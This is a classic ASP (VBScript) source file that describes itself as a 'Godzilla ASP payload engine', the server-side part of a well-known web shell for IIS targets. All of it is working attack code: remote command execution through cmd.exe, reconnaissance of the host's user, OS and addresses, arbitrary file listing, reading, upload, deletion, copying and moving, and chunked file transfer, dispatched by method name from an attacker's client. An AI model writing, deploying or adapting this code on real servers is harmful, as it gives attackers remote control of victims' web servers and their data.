' Matrix-owned Godzilla ASP (classic VBScript) payload engine.
'
' This file is the engine, not the shell stub. The standard Godzilla ASP shell
' does: Execute(Session("payload")) then result = run(content), then writes
' markers + Base64Encode(decryption(result, true)).
'
' Contract: the same methodName API as Godzilla's own engine.
' Note: this engine is not testable on macOS; it is provided for classic IIS
' targets and should be verified on a Windows/IIS host.

Function MxToString(v)
    Dim i, s
    s = ""
    For i = 1 To LenB(v)
        s = s & Chr(AscB(MidB(v, i, 1)))
    Next
    MxToString = s
End Function

Function MxParams(data)
    Dim dict, i, n, key, b
    Set dict = Server.CreateObject("Scripting.Dictionary")
    i = 1
    key = ""
    Do While i <= LenB(data)
        b = AscB(MidB(data, i, 1))
        If b = 2 Then
            If i + 4 > LenB(data) Then Exit Do
            n = AscB(MidB(data, i + 1, 1)) _
                + AscB(MidB(data, i + 2, 1)) * 256 _
                + AscB(MidB(data, i + 3, 1)) * 65536 _
                + AscB(MidB(data, i + 4, 1)) * 16777216
            i = i + 5
            If n < 0 Or i + n - 1 > LenB(data) Then Exit Do
            dict(key) = MxToString(MidB(data, i, n))
            key = ""
            i = i + n
        Else
            key = key & Chr(b)
            i = i + 1
        End If
    Loop
    Set MxParams = dict
End Function

Function MxGet(dict, key)
    If dict.Exists(key) Then
        MxGet = dict(key)
    Else
        MxGet = ""
    End If
End Function

Function MxStringToBinary(text)
    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "iso-8859-1"
    stream.Open
    stream.WriteText text
    stream.Position = 0
    stream.Type = 1
    MxStringToBinary = stream.Read()
    stream.Close
    Set stream = Nothing
End Function

Function MxUtf8(text)
    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "utf-8"
    stream.Open
    stream.WriteText text
    stream.Position = 0
    stream.Type = 1
    MxUtf8 = stream.Read()
    stream.Close
    Set stream = Nothing
End Function

' The standard ASP shell calls Base64Encode on our result.
Function Base64Encode(sText)
    Dim xml, node
    If IsEmpty(sText) Or IsNull(sText) Then
        Base64Encode = ""
        Exit Function
    End If
    Set xml = Server.CreateObject("Msxml2.DOMDocument.3.0")
    Set node = xml.CreateElement("base64")
    node.dataType = "bin.base64"
    If IsArray(sText) Then
        node.nodeTypedValue = sText
    Else
        node.nodeTypedValue = MxStringToBinary(sText)
    End If
    If Mid(node.text, 1, 4) = "77u/" Then
        node.text = Mid(node.text, 5)
    End If
    Base64Encode = Replace(node.text, vbLf, "")
    Set node = Nothing
    Set xml = Nothing
End Function

Function MxBasics()
    Dim sh, net, nl, info
    nl = Chr(13) & Chr(10)
    Set sh = Server.CreateObject("WScript.Shell")
    Set net = Server.CreateObject("WScript.Network")
    info = "OsInfo : " & sh.ExpandEnvironmentStrings("%OS%") & " " & sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") & nl
    info = info & "CurrentUser : " & net.UserName & nl
    info = info & "CurrentDir : " & Server.MapPath(".") & nl
    info = info & "FileRoot : " & sh.ExpandEnvironmentStrings("%SystemDrive%") & "/" & nl
    info = info & "ProcessArch : " & sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") & nl
    info = info & "TempDirectory : " & sh.ExpandEnvironmentStrings("%TEMP%") & nl
    info = info & "SERVER_NAME : " & Request.ServerVariables("SERVER_NAME") & nl
    info = info & "SERVER_ADDR : " & Request.ServerVariables("LOCAL_ADDR") & nl
    info = info & "SERVER_SOFTWARE : " & Request.ServerVariables("SERVER_SOFTWARE") & nl
    MxBasics = info
End Function

Function MxExec(command)
    Dim sh, ex
    On Error Resume Next
    Set sh = Server.CreateObject("WScript.Shell")
    Set ex = sh.Exec("cmd.exe /c " & command)
    If Err.Number <> 0 Then
        Err.Clear
        MxExec = "Exception: " & Err.Description
        Exit Function
    End If
    MxExec = ex.StdOut.ReadAll() & ex.StdErr.ReadAll()
    On Error GoTo 0
End Function

Function MxGetFile(dir)
    Dim fso, folder, f, subFolder, nl, text, path
    nl = Chr(13) & Chr(10)
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If dir = "" Then dir = Server.MapPath(".")
    If Not fso.FolderExists(dir) Then
        MxGetFile = "Path Not Found Or No Permission!"
        Exit Function
    End If
    Set folder = fso.GetFolder(dir)
    path = Replace(folder.Path, "\", "/")
    If Right(path, 1) <> "/" Then path = path & "/"
    text = "ok" & nl & path & nl
    For Each f In folder.Files
        text = text & f.Name & Chr(9) & "1" & Chr(9) & f.DateLastModified & Chr(9) & f.Size & Chr(9) & "RW" & nl
    Next
    For Each subFolder In folder.SubFolders
        text = text & subFolder.Name & Chr(9) & "0" & Chr(9) & subFolder.DateLastModified & Chr(9) & "0" & Chr(9) & "RW" & nl
    Next
    Err.Clear
    MxGetFile = text
End Function

Function MxReadFile(path)
    Dim stream
    On Error Resume Next
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile path
    If Err.Number <> 0 Then
        Err.Clear
        MxReadFile = "File Not Found"
        Exit Function
    End If
    MxReadFile = stream.Read()
    stream.Close
    Set stream = Nothing
    On Error GoTo 0
End Function

Function MxUploadFile(path, value)
    Dim stream
    If path = "" Then
        MxUploadFile = "fail"
        Exit Function
    End If
    On Error Resume Next
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write MxStringToBinary(value)
    stream.SaveToFile path, 2
    stream.Close
    Set stream = Nothing
    If Err.Number <> 0 Then
        Err.Clear
        MxUploadFile = "fail"
        Exit Function
    End If
    On Error GoTo 0
    MxUploadFile = "ok"
End Function

Function MxNewFile(path)
    Dim fso, f
    If path = "" Then
        MxNewFile = "fail"
        Exit Function
    End If
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    Set f = fso.CreateTextFile(path, True)
    If Err.Number <> 0 Then
        Err.Clear
        MxNewFile = "fail"
        Exit Function
    End If
    f.Close
    Set f = Nothing
    On Error GoTo 0
    MxNewFile = "ok"
End Function

Function MxNewDir(path)
    Dim fso
    If path = "" Then
        MxNewDir = "fail"
        Exit Function
    End If
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    fso.CreateFolder path
    If Err.Number <> 0 Then
        Err.Clear
        If fso.FolderExists(path) Then
            MxNewDir = "ok"
        Else
            MxNewDir = "fail"
        End If
        Exit Function
    End If
    On Error GoTo 0
    MxNewDir = "ok"
End Function

Function MxDelete(path)
    Dim fso
    If path = "" Then
        MxDelete = "fail"
        Exit Function
    End If
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If fso.FolderExists(path) Then
        fso.DeleteFolder path, True
    ElseIf fso.FileExists(path) Then
        fso.DeleteFile path, True
    Else
        MxDelete = "fail"
        Exit Function
    End If
    If Err.Number <> 0 Then
        Err.Clear
        MxDelete = "fail"
        Exit Function
    End If
    On Error GoTo 0
    MxDelete = "ok"
End Function

Function MxCopy(src, dst)
    Dim fso
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    fso.CopyFile src, dst, True
    If Err.Number <> 0 Then
        Err.Clear
        MxCopy = "fail"
        Exit Function
    End If
    On Error GoTo 0
    MxCopy = "ok"
End Function

Function MxMove(src, dst)
    Dim fso
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    fso.MoveFile src, dst
    If Err.Number <> 0 Then
        Err.Clear
        MxMove = "fail"
        Exit Function
    End If
    On Error GoTo 0
    MxMove = "ok"
End Function

Function MxBigDownload(path, mode, position, readByteNum)
    Dim fso, stream
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If mode = "fileSize" Then
        MxBigDownload = CStr(fso.GetFile(path).Size)
        Exit Function
    End If
    If mode <> "read" Then
        MxBigDownload = "no mode"
        Exit Function
    End If
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile path
    stream.Position = CLng(position)
    MxBigDownload = stream.Read(CLng(readByteNum))
    stream.Close
    Set stream = Nothing
    On Error GoTo 0
End Function

Function MxBigUpload(path, value, position)
    Dim stream
    If path = "" Then
        MxBigUpload = "fail"
        Exit Function
    End If
    On Error Resume Next
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    If position = "" Then
        stream.Write MxStringToBinary(value)
        stream.SaveToFile path, 2
    Else
        stream.LoadFromFile path
        stream.Position = CLng(position)
        stream.Write MxStringToBinary(value)
        stream.SaveToFile path, 2
    End If
    stream.Close
    Set stream = Nothing
    If Err.Number <> 0 Then
        Err.Clear
        MxBigUpload = "fail"
        Exit Function
    End If
    On Error GoTo 0
    MxBigUpload = "ok"
End Function

Function run(data)
    Dim dict, method, result
    If LenB(data) = 0 Then
        run = ""
        Exit Function
    End If
    On Error Resume Next
    Set dict = MxParams(data)
    method = MxGet(dict, "methodName")
    Select Case method
        Case "getBasicsInfo"
            result = MxUtf8(MxBasics())
        Case "execCommand"
            result = MxUtf8(MxExec(MxGet(dict, "cmdLine")))
        Case "getFile"
            result = MxUtf8(MxGetFile(MxGet(dict, "dirName")))
        Case "readFileContent"
            result = MxReadFile(MxGet(dict, "fileName"))
        Case "uploadFile"
            result = MxUtf8(MxUploadFile(MxGet(dict, "fileName"), MxGet(dict, "fileValue")))
        Case "newFile"
            result = MxUtf8(MxNewFile(MxGet(dict, "fileName")))
        Case "newDir"
            result = MxUtf8(MxNewDir(MxGet(dict, "dirName")))
        Case "deleteFile"
            result = MxUtf8(MxDelete(MxGet(dict, "fileName")))
        Case "copyFile"
            result = MxUtf8(MxCopy(MxGet(dict, "srcFileName"), MxGet(dict, "destFileName")))
        Case "moveFile"
            result = MxUtf8(MxMove(MxGet(dict, "srcFileName"), MxGet(dict, "destFileName")))
        Case "bigFileDownload"
            result = MxBigDownload(MxGet(dict, "fileName"), MxGet(dict, "mode"), MxGet(dict, "position"), MxGet(dict, "readByteNum"))
            If MxGet(dict, "mode") = "fileSize" Then result = MxUtf8(result)
        Case "bigFileUpload"
            result = MxUtf8(MxBigUpload(MxGet(dict, "fileName"), MxGet(dict, "fileContents"), MxGet(dict, "position")))
        Case "test"
            result = MxUtf8("ok")
        Case Else
            result = MxUtf8("unknown method: " & method)
    End Select
    If Err.Number <> 0 Then
        result = MxUtf8("Exception: " & Err.Description)
        Err.Clear
    End If
    On Error GoTo 0
    run = result
End Function
